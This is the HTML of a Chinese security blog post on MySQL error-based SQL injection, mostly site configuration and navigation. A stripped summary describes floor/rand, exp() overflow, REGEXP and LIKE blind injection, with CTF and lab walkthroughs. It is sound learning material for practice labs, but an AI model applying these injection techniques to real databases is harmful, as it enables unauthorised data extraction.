<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>再探SQL报错注入 | hybcx</title><meta name="keywords" content="基本知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="再探SQL报错注入"><meta name="application-name" content="再探SQL报错注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="再探SQL报错注入"><meta property="og:url" content="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。 0x02 rand和order by报错注入 一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句 RAND() in a"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 本文的产生是由于刚刚刷PentesterLab靶场遇到的SQL注入问题，发现自己对SQL报错注入还是有一定的欠缺，故此来复习一波。 0x02 rand和order by报错注入 一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句 RAND() in a"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '再探SQL报错注入',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 rand和order by报错注入, Floor（）函数, 0x03 EXP函数报错注入, 注出数据, Insert位置注入, Update位置注入, exp() 函数进行盲注, 2021 虎符杯 CTF Finalweb Hatenum, 0x04 REGEXP与LIKE注入, REGEXP注入分析, 1、基本注入, 2、REGEXP盲注, LIKE注入分析, 1、基本注入, 2、LIKE盲注, 3、REGEXP注入实战, BJDCTF 2nd 简单注入, 0x05 后言, 0x06 参考文章前言本文的产生是由于刚刚刷靶场遇到的注入问题发现自己对报错注入还是有一定的欠缺故此来复习一波和报错注入一般意义上来说我们常用的显错注入手段是这两个在的官方文档中有这样一句译文每次执行时都会重新计算子句中的不能在子句中使用带有值的列因为会多次计算该列也就是说不能作为的条件字段同理所以有如下其中为后面又所以会爆出译文密钥的条目重复其中就是的内容这样一步步就能拿到想要的信息在前面的中其实还有个很重要的函数是取整在之前的文章中研究过这样会产生重复的随机数从而在时候报错接下来详细分析一波上述的原理函数联合使用向下取整生成一个之间的随机数不包括和统计某个表下面一共有多少记录按照一定的规则对进行排序报错原理和联合使用的时候如果临时表中没有该主键则再插入的之前会再计算一次然后再由将计算出来的主键直接插入到临时表格之中导致主键重复然后报错上述是这些函数的简单用法以下不想费劲搭环境了直接照搬师傅的了在这里使用的时候回生成一张临时表也叫做虚拟表而且表都是有主键的作为主键的列是不能由重复的好比第一个值的主键为那么就不能再有主键为的值了接下来可以再是可以看到上述两幅图片中第二幅图片的序列明显更规律也就是伪序列首先这是一个虚拟表自然就有主键当使用去读这些数据的时候好比上面这个伪随机序列读完第一列发现主键之中没有这个数字但由于的存在他不会立刻插入而是会继续运算一次函数然后经过之后变成了随后率先插入的数字便成了然后取第二条数据此时之后为数字但该虚拟表中已经有了则该数字对应的值自增继续从的表中取第三条记录再次计算结果为由于表中不存在数字则继续一次经过之后成了但根据特性该数字会硬插入该虚拟表中导致了数字的重复最终报错这里是个例子将的位置换做别的就可以显示出别的错误了爆库可以看到使用的后面的数字是函数产生的这里可以看到具体信息了其实就是利用了的统计与的合作然后基于主键唯一的机制然后造成了这个错误模板大致如下第一种第二种第二种第三种只需将上面模板中的内容替换成为我们的查询即可与均是字段别名函数报错注入作用计算以为底的幂值语法报错原理当参数超过了之后函数就会报错中的函数用于将提升为指定数字的幂这里是自然对数的底数该函数可以用来进行报错注入但是为什么会报错呢我们知道次方到后边每增加其结果都将跨度极大而能记录的数值范围有限一旦结果超过范围则该函数报错这个范围的极限是当传递一个大于的值时函数就会引起一个溢出错误除了之外还有类似之类的相似函数同样是可利用的他们的原理相同使用版本及以上版本现在我们已经知道当传递一个大于的值时函数就会引起一个溢出错误那么我们在实际利用中如何让报错的同时返回我们想要得到的数据呢我们可以用运算符按位取反的方式得到一个最大值该运算符也可以处理一个字符串经过其处理的字符串会变成大一个很大整数足以超过的数组范围从而报错输出如上图所示成功报错并输出了数据但是事实证明在之后报错不能返回我们的查询结果而只会得到一个报错下面由于实操的时候在安装低版本总是报错我就直接照搬了见谅注出数据得到表名得到列名检索数据读取文件有行的限制这个查询可以从当前的上下文中出所有的与我们也可以出所有的数据库但由于我们是通过报错来获取因此它返回的结果有限那对于这个我有所疑惑因此我询问了其中的符号的作用在这个查询语句中是一个用户变量用于存储中间结果在这里的作用是在不同的步骤中保留中间拼接的字符串让我解释一下这是一个初始化步骤将用户变量设置为零在这一步函数用于将当前的值与新的字符串拼接然后将结果再次存储在变量中这样变量逐渐被构建起来包含了多次拼接的结果实际上这两个符号是同一个用户变量只是在不同的时刻被使用第一个是在初始化时使用而后续的是在拼接字符串时使用用于保留中间结果位置注入根据位置的注入方式按部就班就好了假设原来的插入语句如下我们可以在或位置插入恶意的语句进行报错注入如下所示在处插入则语句为爆出所有数据在处插入位置注入根据位置的注入方式按部就班就好了假设原来的插入语句如下我们可以在或后面的子句处插入恶意的语句进行报错注入如下所示在处插入则语句为函数进行盲注有的登录逻辑会根据语句的报错与否返回不同的结果如果我们可以控制这里得报错的话便可以进行盲注下面我们通过一个例题来进行详细探究虎符杯进入题目是一个登录页面对我来说有点难度只能基本抄了我们先分析一波题目给的源码这里说如果我们存储在变量中的的话就给数据库配置信息进行数据库连接查询用户输入的用户名是否在数据库中注册功能部分如果查询到对应用户名则成功登录进行了很有力的过滤不过没有过滤与那我们重点关注一下语句部分这里似乎可以构造万能密码似乎与我之前刷的靶场思路一致括号内就是的值这样的话可以成功绕过但这里有一个验证码无从得知只能看了所以我们的思路是使用即按照之前匹配注入的方法将匹配出来我们又在函数中注意到当使用正则匹配时使用和操作符或和功能是一样的要全部匹配才返回而和则是部分匹配即可返回好好好又得学习一波注入了如果语句报错就返回如果语句出现错误便返回字符串然后进入到中就会返回根据这里的特性如果我们可以控制这里的报错的话便可以进行盲注但是怎么构造呢在网上的看到了大佬的思路是真的巧妙即如果中的语句执行匹配后的结果为经过减号转换后为后不会溢出若为转换为后则会溢出并报错大致的如下对于上述的解释例子如上解释如下大概关键字就是用来区分大小写的吧这段语句可以分为两部分让我一步一步解释这部分执行一个子查询获取当前数据库的名称这部分使用正则表达式进行匹配并且使用进行二进制比较是中用于执行正则表达式匹配的操作符是一个修饰符用于表示要进行二进制比较在这个上下文中它确保正则表达式的匹配是对字节进行精确匹配而不考虑字符的大小写或编码是一个正则表达式模式表示以开头的字符串综合起来整个语句的含义是检查当前数据库的名称是否以开头如果匹配成功查询将返回表示真否则返回表示假但这里题目过滤了引号所以我们无法直接引入和按照之前的注入操作我们可以将连同后面的待猜测字符一块做编码之后进入数据库中会自动将进制编码的字符转为对应的字符串转换进制进制在数据库执行查询时又默认转换成字符串题目还限制了位置匹配的字符串长度最长只能匹配个字符如果超过了个则会返回错误但我不知道为何师傅们都说最多只能个字符我看着正则当中是数字不应该是个字符吗不理解接着我幸运地找到了一个解释同时有个判断十六进制位数不能超过位既字符串不能超过位一个字母对应个十六进制数所以在包含正则以外的字符串超过位时需要不断做替换用位字符串去匹配下一位那这样的话我们便不能在里面使用了也就没有办法在正则表达式中确定首位的位置我们只能知道有这么几个连续的字符就像下面这样师傅的爆破思路先爆破出前三位来然后再通过前位爆第位再通过第位爆第位编写如下脚本进行爆破转换进制进制在数据库执行查询时又默认转换成字符串代替空格出结果了别高兴的太早因为这里陷入了一个死循环当中可以看到爆出之后不停地循环出现所以我们可以推测出真正的里面有两个其中位于前面的那个后面紧跟着一个即后面那个后面跟的是那个字符我们还不能确定那我们便可以测试一下除了以外的其他字符经测试第二个后面跟的字符是即然后继续根据爆破接下来的字符就行了最后得到的如下不过这里我也是想不通最后这个死循环的解决原理然后直接登陆即可得到接着我又找了几篇发现有位师傅直接从最后一个字符开始匹配用到了正则是一个用于锚定模式结尾位置的元字符用于确保匹配发生在输入字符串的末尾这样就不会有上述重复的问题但是也要配合从第一位开始爆破的脚本这样两者对比才可正确得出转换进制进制在数据库执行查询时又默认转换成字符串如上图最后简单反转一下字符串即可最后会有如下我们两者对比得到只能说脚本对我来说好难接下来就是跟着编写脚本的时候了完整代码如上不过我自己在编写完成后发现从后面开始匹配的方法有一定几率一次成功与注入这里质量低下知识点基本都是照搬的有的只是自己的思考和实操罢了注入分析注入原理注入即正则表达式注入注入又叫盲注值正则表达式攻击应用场景就是盲注原理是直接查询自己需要的数据然后通过正则表达式进行匹配基本注入语句正则正常的查询语句正则注入若匹配则返回不匹配返回表示模式串的开头即若匹配到字段下的数据开头为则返回否则返回关键字还可以代替条件里的号使用场景过滤了若被过滤可使用来从后往前进行匹配深有感悟啊常用正则语句判断一个表的第一个字符串是否在中判断第一个字符串是否为判断一个表的第二个字符串是否在中在联合查询中的使用上述处只会显示或者这样就能知道我们的是否匹配成功盲注在靶场关进行测试判断数据库长度正常判断数据库名正常正常表名字段名数据内容不再赘述很明显和普通的布尔盲注差不多附上大师傅的脚本注入分析匹配百分比通配符允许匹配任何字符串的零个或多个字符下划线通配符允许匹配任何单个字符基本注入判断第一个字符是否为判断前面两个字符串是否为判断是否包含两个字符串不过测试下来发现待测字符的开头一定要为正确的否则页面一直返回也就是无法匹配类似这类字符判断是否为个字符判断第一个字符是否为盲注依旧在靶场关进行测试判断数据库长度可用函数也可用如判断数据库名也可用说明数据库名的第一个字符是数据表字段数据类似把盲注脚本改一下于是成了盲注脚本注入实战简单注入发现提示这里给出了语句很明显又是相同的套路我们进行如下赋值括号只是一个提示作用简单一下看一下过滤情况过滤的有等等但是没过滤如上图发现页面有变化接下来进一步测试发现页面回显不一致但始终只有这两条信息这意味着我们需要进行盲注了直接上脚本这里我先尝试自己写一番成功得到密码我们登录即可得到后言本次对于报错注入的学习有些许深刻日后会随缘更新补充本文希望可以对报错注入有一个完全的掌握参考文章报错注入下如何使用函数进行注入显错注入虎符网络安全赛道函数与正则过滤注入与注入学习笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-02-03 09:42:57',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span 